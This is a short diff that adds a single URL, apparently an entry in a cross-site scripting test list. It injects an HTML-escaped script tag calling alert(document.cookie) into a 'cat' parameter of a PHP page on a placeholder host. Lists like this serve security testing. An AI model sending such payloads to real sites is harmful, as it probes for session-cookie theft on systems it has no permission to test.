@@ -1,0 +1,2 @@
+
+http://wwww.example.com/cat.php?cat=&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
